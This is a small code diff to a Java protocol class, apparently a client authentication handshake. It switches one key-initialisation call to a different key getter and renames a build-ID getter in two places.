@@ -58,7 +58,7 @@ public class ZProtocol extends Protocol {
         //#endif
 
         // key init
-        cryptoConf.makeKey(Encryption.getKeys().getChallengeKey());
+        cryptoConf.makeKey(Encryption.getKeys().getProtoKey());
         RandomSource.getBytes(Kd);
         RandomSource.getBytes(Nonce);
 
@@ -233,7 +233,7 @@ public class ZProtocol extends Protocol {
                 "forgeAuthentication, wrong array size");
         //#endif
 
-        dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
+        dataBuffer.write(Utils.padByteArray(keys.getBuildID(), 16));
         dataBuffer.write(keys.getInstanceId());
         dataBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));
 
@@ -244,7 +244,7 @@ public class ZProtocol extends Protocol {
 
         // calculating digest       
         final SHA1Digest digest = new SHA1Digest();
-        digest.update(Utils.padByteArray(keys.getBuildId(), 16));
+        digest.update(Utils.padByteArray(keys.getBuildID(), 16));
         digest.update(keys.getInstanceId());
         digest.update(Utils.padByteArray(Device.getSubtype(), 16));
         digest.update(keys.getConfKey());
